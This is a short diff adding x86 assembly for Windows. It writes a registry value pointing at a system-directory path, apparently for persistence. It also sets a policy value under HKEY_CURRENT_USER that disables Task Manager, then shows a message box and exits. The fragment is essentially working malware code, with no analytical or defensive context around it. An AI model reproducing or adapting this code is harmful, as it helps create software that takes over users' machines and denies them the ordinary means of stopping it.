@@ -74,3 +74,41 @@ Path_Size:
     inc  ecx
     inc  esi
     jmp  Path_Size
+done:
+    inc  ecx
+ 
+    push DWORD ecx
+    push DWORD Sys_Dir
+    push REG_SZ
+    push DWORD 0x00000000
+    push DWORD Reg_Name
+    push DWORD [Key_Handle]
+    call [RegSetValueExA]  ;Set registry value
+ 
+    push DWORD [Key_Handle]
+    call [RegCloseKey]
+ 
+    xor  eax,eax
+    mov  DWORD [Key_Handle],eax ;Clear Key handle
+    push DWORD Key_Handle
+    push DWORD Task_Man
+    push DWORD HKEY_CURRENT_USER
+    call [RegCreateKeyA]  
+    push DWORD 0x00000004
+    push DWORD Key_Value
+    push DWORD REG_DWORD
+    push DWORD 0x00000000
+    push DWORD Task_Man_Key
+    push DWORD [Key_Handle]
+    call [RegSetValueExA]  ;Disable taskmanager
+    push DWORD [Key_Handle]
+    call [RegCloseKey]
+ 
+    push DWORD MB_OK|MB_ICONINFORMATION
+    push DWORD szTitle
+    push DWORD szText
+    push DWORD 0x00000000
+    call [MessageBoxA]   ;Popup Info box
+ 
+    push DWORD 0x00000000
+    call [ExitProcess]   ;Exit
